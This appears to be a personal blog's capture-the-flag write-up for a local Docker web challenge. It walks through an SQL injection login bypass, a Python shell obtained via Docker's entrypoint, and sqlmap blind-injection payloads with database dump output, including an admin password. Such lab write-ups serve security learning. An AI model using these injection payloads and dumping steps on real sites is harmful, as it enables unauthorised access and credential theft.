@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><title>❔ [0x04] Exploit: Broken page &ndash; ~/cake</title>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="utf-8"/>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/devicon/2.15.1/devicon.min.css" integrity="sha512-X2hbziex+UPQ+KdI4BWI+39jEDhf2Smc6bfFI/FTIzWnt7mbwZCUU4RWalnMfxtHCpISlexzmd2kvPFJCliiPA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+
+
+<link rel="stylesheet" href="https://cakehonolulu.github.io/css/colour/gruvbox-dark.css">
+<link rel="stylesheet" href="https://cakehonolulu.github.io/css/colour/dark-mode.css">
+<link rel="stylesheet" href="https://cakehonolulu.github.io/css/risotto.css">
+<link rel="stylesheet" href="https://cakehonolulu.github.io/css/custom.css">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><h1 class="page__logo"><a href="https://cakehonolulu.github.io" class="page__logo-inner">~/cake</a></h1>
+<nav class="page__nav main-nav">
+    <ul>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item active" href="/ctfs/" title="writeups">writeups</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <h1 id="0x04-exploit-broken-page">❔ [0x04] Exploit: Broken page</h1>
+
+    <h1 id="1--provided-challenge-description">1.- Provided challenge description</h1>
+<br>
+<p>This one will introduce you a bit to Docker because you will need to run a docker in order to find the solution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull adventofhackupc/exploit-challenge:latest
+</span></span><span style="display:flex;"><span>docker run -p 8000:8000 adventofhackupc/exploit-challenge:latest
+</span></span><span style="display:flex;"><span>Then open http://localhost:8000/ on your pc.</span></span></code></pre></div>
+<h1 id="2--provided-files">2.- Provided files</h1>
+<br>
+<code>None</code>
+<h1 id="3--challenge">3.- Challenge</h1>
+<br>
+<p>If you access localhost:8000/ (After pulling and running the docker image) on your preferred webbrowser, you&rsquo;ll be greeted with this simple website:</p>
+<p><img src="/images/ctfs/hackupc/advent_of_code/bkp.png" alt="BKP"></p>
+<p>You can test the default user-password combinations (admin:admin, root:root&hellip;) but none of them will work&hellip;</p>
+<p>Enter&hellip; <a href="https://portswigger.net/web-security/sql-injection">SQL Injection Attacks!</a></p>
+<p>The main idea behind this challenge is to feed the site&rsquo;s textboxes some values that could trigger an injection, to do so, it&rsquo;s best to have a cheatsheet on hand
+and start checking for basic SQLi payloads.</p>
+<p>The first payload I tested was the classic: <code>admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1</code> which worked out-of-the-box and redirected me to the
+admin sitemap.</p>
+<p><img src="/images/ctfs/hackupc/advent_of_code/bkp_admin.png" alt="BKP_admin"></p>
+<p>Now, it&rsquo;s a matter of navigating inside the Codes webpage, then Code Object and&hellip;</p>
+<p><code>Advent{daFAkeRCUywkDTdCjuQwByTWPXiVKnyS}</code></p>
+<p>EDIT (11-05-2022):</p>
+<p>I&rsquo;ve just found another way to retrieve the flag, this is done by abusing the <code>&ndash;entrypoint</code> argument of docker</p>
+<p>One can view the docker image build log with the image command&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo docker image history adventofhackupc/exploit-challenge:latest --no-trunc &gt; history.txt</span></span></code></pre></div>
+<p>&hellip;and by inspecting it, you can see that there are no binaries in <code>/bin</code> so you can&rsquo;t access the machine using a command shell.</p>
+<p>If you further inspect the log, you&rsquo;ll see that <code>/usr/local/bin/python3</code> is still available for us to run so let&rsquo;s go ahead and do so.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Python 3.9.11 <span style="color:#f92672">(</span>main, Mar <span style="color:#ae81ff">18</span> 2022, 16:45:24<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>GCC 10.2.1 20210110<span style="color:#f92672">]</span> on linux
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;</span></span></code></pre></div>
+<p>We got in&hellip;</p>
+<p>Alright, now what we can do is two things, first and foremost, check what&rsquo;s in the current directory; to do so, execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os;
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>lisrdir();</span></span></code></pre></div>
+<p>This should print the contents of $PWD (Current working directory):</p>
+<p><code>[&lsquo;db.sqlite3&rsquo;, &lsquo;requirements.txt&rsquo;, &lsquo;.dockerignore&rsquo;, &lsquo;manage.py&rsquo;, &lsquo;advent&rsquo;, &lsquo;venv&rsquo;, &lsquo;.idea&rsquo;, &lsquo;pwned&rsquo;, &rsquo;templates&rsquo;]</code></p>
+<p>Aha! An sqlite database! Let&rsquo;s try to retrieve the flag using python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sqlite3;
+</span></span><span style="display:flex;"><span>bpg <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;db.sqlite3&#39;</span>);
+</span></span><span style="display:flex;"><span>cursor <span style="color:#f92672">=</span> bpg<span style="color:#f92672">.</span>cursor();</span></span></code></pre></div>
+<p>Now let&rsquo;s view all the tables the sqlite db has, we can do so using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39;;&#34;</span>);
+</span></span><span style="display:flex;"><span>print(cursor<span style="color:#f92672">.</span>fetchall());</span></span></code></pre></div>
+<p><code>[(&lsquo;django_migrations&rsquo;,), (&lsquo;sqlite_sequence&rsquo;,), (&lsquo;auth_group_permissions&rsquo;,), (&lsquo;auth_user_groups&rsquo;,), (&lsquo;auth_user_user_permissions&rsquo;,), (&lsquo;django_admin_log&rsquo;,), (&lsquo;django_content_type&rsquo;,), (&lsquo;auth_permission&rsquo;,), (&lsquo;auth_group&rsquo;,), (&lsquo;auth_user&rsquo;,), (&lsquo;advent_code&rsquo;,), (&lsquo;django_session&rsquo;,)]</code></p>
+<p>That looks&hellip; interesting&hellip; Let&rsquo;s print the <code>advent_code</code> table&hellip;</p>
+<p><code>[(1, &lsquo;daFAkeRCUywkDTdCjuQwByTWPXiVKnyS&rsquo;)]</code></p>
+<p>Aha!</p>
+<p><code>Advent{daFAkeRCUywkDTdCjuQwByTWPXiVKnyS}</code></p>
+<p>EDIT (12-05-2022):</p>
+<p>Aaaaand&hellip; another way to pwn the challenge was found, this time, we&rsquo;ll deal around with a time-based SQL Injection.</p>
+<p>It looks like the name &ldquo;Broken Page&rdquo; was really fitting after all&hellip; ;)</p>
+<p>For this setup we&rsquo;ll need 2 utilities, PortSwigger&rsquo;s BURP Suite and sqlmap.</p>
+<p>If you look inside the website&rsquo;s source code, you&rsquo;ll see that it has a field containing a CSRF Token.</p>
+<p>While CSRF Tokens are out-of-scope for this challenge, they tend to be really obnoxious if you depend on making multiple requests
+to the same website.</p>
+<p>This is why we need a way to automatically get them for our payloads to work correctly.</p>
+<p>Run BURP and set your browser&rsquo;s proxy accordingly to intercept HTTP Requests with it.</p>
+<p>Click submit and you should see that BURP starts intercepting the requests.</p>
+<p><img src="/images/ctfs/hackupc/advent_of_code/bpg.gif" alt="BPG"></p>
+<p>Take note of <code>csrfmiddlewaretoken</code>, it&rsquo;ll come in handy in the following steps.</p>
+<p>Leave BURP open, it&rsquo;ll act as the proxy for sqlmap!</p>
+<p>The next thing we&rsquo;ll do is run sqlmap with the following arguments:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -u localhost:8000/ --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrfmiddlewaretoken={YOUR_TOKEN_HERE}&amp;username=admin&amp;password=admin&#34;</span> -p <span style="color:#e6db74">&#34;csrfmiddlewaretoken,username,password&#34;</span> --proxy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span></span></span></code></pre></div>
+<p>You&rsquo;re probably wondering what this command does, let me break it down for you:</p>
+<p><code>-u</code> Specifies the address to run the scan off (In our case, localhost:8000)</p>
+<p><code>&ndash;data</code> Specifies the data we control (csrfmiddlewaretoken field, username and password ones)</p>
+<p><code>-p</code> Specifies which parameters sqlmap can use to run it&rsquo;s tests</p>
+<p><code>&ndash;proxy</code> Specifies a proxy to use (We default to BURP), this helps gathering a new anti-CSRF token automatically</p>
+<p><code>&ndash;level=5 &ndash;risk=3</code> This parameters enable us to perform a deeper scan (Which finds the vulnerability we&rsquo;ll be using)</p>
+<p>Go take a shower or make a coffee, this takes it&rsquo;s time.</p>
+<p>If sqlmap asks you permission to update the CSRF token automatically, say &lsquo;Y&rsquo;</p>
+<p>Same for cookies!</p>
+<p>IMPORTANT! If it asks you to follow a 302 redirect, say no!</p>
+<p>At the end, you should see something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap resumed the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> from stored session:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: username <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Type: boolean-based blind
+</span></span><span style="display:flex;"><span>Title: OR boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>NOT - comment<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Payload: csrfmiddlewaretoken<span style="color:#f92672">={</span>YOUR_TOKEN_HERE<span style="color:#f92672">}</span>&amp;username<span style="color:#f92672">=</span>admin%<span style="color:#e6db74">&#39; OR NOT 2702=2702-- CFzp&amp;password=admin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type: time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Title: SQLite &gt; 2.0 OR time-based blind (heavy query)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Payload: csrfmiddlewaretoken={YOUR_TOKEN_HERE}&amp;username=admin%&#39;</span> OR 2531<span style="color:#f92672">=</span>LIKE<span style="color:#f92672">(</span>CHAR<span style="color:#f92672">(</span>65,66,67,68,69,70,71<span style="color:#f92672">)</span>,UPPER<span style="color:#f92672">(</span>HEX<span style="color:#f92672">(</span>RANDOMBLOB<span style="color:#f92672">(</span>500000000/2<span style="color:#f92672">))))</span> AND <span style="color:#e6db74">&#39;kTvW%&#39;</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>kTvW&amp;password<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span>---</span></span></code></pre></div>
+<p>If that&rsquo;s the case, congrats! You&rsquo;ve got halfway through the challenge, now use the second payload to dump the database.</p>
+<p>The only difference in the command is that you&rsquo;ll have to add <code>&ndash;dump-all</code> to start dumping the database
+using the time-based SQLi. This will take a lot of time, be patient.</p>
+<p>You could also try to dump individual tables but it&rsquo;s funnier to retrieve the entire DB, I&rsquo;ll leave it as an exercise for the reader to find how
+to do so.</p>
+<p>If you leave it running enough time you&rsquo;ll get not only the flag, but the real admin password too:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Database</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">current</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Table</span>: advent_code
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span> entry]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-----+----------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">|</span> solution                         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-----+----------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>  <span style="color:#f92672">|</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">|</span> daFAkeRCUywkDTdCjuQwByTWPXiVKnyS <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-----+----------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Database</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">current</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Table</span>: auth_user
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span> entry]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-----+-----+-----+---------+----------+--------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">150</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">254</span> <span style="color:#f92672">|</span> email   <span style="color:#f92672">|</span> is_staff <span style="color:#f92672">|</span> password                       <span style="color:#f92672">|</span> username <span style="color:#f92672">|</span> is_active <span style="color:#f92672">|</span> last_name <span style="color:#f92672">|</span> first_name <span style="color:#f92672">|</span> last_login                 <span style="color:#f92672">|</span> date_joined                <span style="color:#f92672">|</span> is_superuser <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-----+-----+-----+---------+----------+--------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>  <span style="color:#f92672">|</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">150</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">254</span> <span style="color:#f92672">|</span> <span style="color:#f92672">&lt;</span>blank<span style="color:#f92672">&gt;</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>        <span style="color:#f92672">|</span> )<span style="color:#ae81ff">6</span>IniSBpFVHdshB<span style="color:#f92672">%</span>eB4;)wnbcB.K2n <span style="color:#f92672">|</span> <span style="color:#66d9ef">admin</span>    <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>         <span style="color:#f92672">|</span> <span style="color:#f92672">&lt;</span>blank<span style="color:#f92672">&gt;</span>   <span style="color:#f92672">|</span> <span style="color:#f92672">&lt;</span>blank<span style="color:#f92672">&gt;</span>    <span style="color:#f92672">|</span> <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">05</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span> <span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">30</span>:<span style="color:#ae81ff">55</span>.<span style="color:#ae81ff">376943</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">05</span> <span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">23</span>.<span style="color:#ae81ff">773508</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>            <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-----+-----+-----+---------+----------+--------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+</span></span></span></code></pre></div>
+<p><code>Advent{daFAkeRCUywkDTdCjuQwByTWPXiVKnyS}</code></p>
+<p>User: <code>admin</code><br>Password: <code>)6IniSBpFVHdshB%eB4;)wnbcB.K2n</code><br><br>;)</p>
+
+
+    <ul>
+    
+    </ul>
+
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/cakehonolulu" rel="me" aria-label="My GitHub" title="My GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://twitter.com/cakehonolulu" rel="me" aria-label="My Twitter" title="My Twitter"><i class="fa-brands fa-twitter" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.linkedin.com/in/joel-bueno-39893a230" rel="me" aria-label="My LinkedIn" title="My LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+                </div>
+            </section>
+
+            <footer class="page__footer"><p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
